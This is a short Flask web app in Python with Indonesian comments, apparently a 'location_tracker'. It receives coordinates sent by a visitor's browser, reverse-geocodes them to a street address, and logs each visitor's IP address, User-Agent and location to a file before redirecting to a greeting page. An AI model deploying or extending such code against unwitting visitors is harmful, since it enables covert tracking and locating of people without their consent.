from flask import Flask, request, redirect, render_template
from datetime import datetime
import os
from geopy.geocoders import Nominatim

app = Flask(__name__)

# Folder hasil simpan lokasi
FOLDER = "hasil"
LOKASI_FILE = os.path.join(FOLDER, "hasil_lokasi.txt")

# Geolocator
geolocator = Nominatim(user_agent="location_tracker")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/track_location', methods=['POST'])
def track_location():
    """Terima lokasi dari browser dan simpan ke file"""
    user_location = request.form.get('location')
    if not user_location:
        return "❌ No location data received."

    try:
        lat, lon = user_location.split(",")
        lat, lon = lat.strip(), lon.strip()
    except ValueError:
        return "❌ Invalid location format. Please use 'latitude,longitude'."

    data = {
        "User-Agent": request.headers.get("User-Agent", "Unknown"),
        "IP Address": request.remote_addr or "Unknown"
    }

    alamat = get_address(lat, lon)
    simpan_hasil(data, lat=lat, lon=lon, alamat=alamat)
    return redirect("/ucapan")

def get_address(lat, lon):
    """Reverse geocoding"""
    try:
        location = geolocator.reverse(f"{lat}, {lon}", language="id")
        if location:
            return location.address
        else:
            return "Alamat tidak ditemukan"
    except Exception as e:
        return f"Error geocoding: {e}"

def simpan_hasil(data_dict, lat=None, lon=None, alamat=None):
    if not os.path.exists(FOLDER):
        os.makedirs(FOLDER)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(LOKASI_FILE, "a", encoding="utf-8") as f:
        f.write(f"=== Data disimpan pada {timestamp} ===\n")
        for k, v in data_dict.items():
            f.write(f"{k}: {v}\n")
        f.write("-" * 40 + "\n")

    if lat and lon:
        with open(LOKASI_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] Latitude: {lat}, Longitude: {lon}\n")
            if alamat:
                f.write(f"Alamat: {alamat}\n")
            f.write("-" * 40 + "\n")

        print(f"[{timestamp}] IP: {data_dict.get('IP Address')} | Lat: {lat}, Lon: {lon} | Alamat: {alamat}")

    return "✅ Data berhasil disimpan!"

@app.route('/ucapan')
def ucapan():
    return render_template('ucapan.html')

if __name__ == '__main__':
    app.run(debug=True)
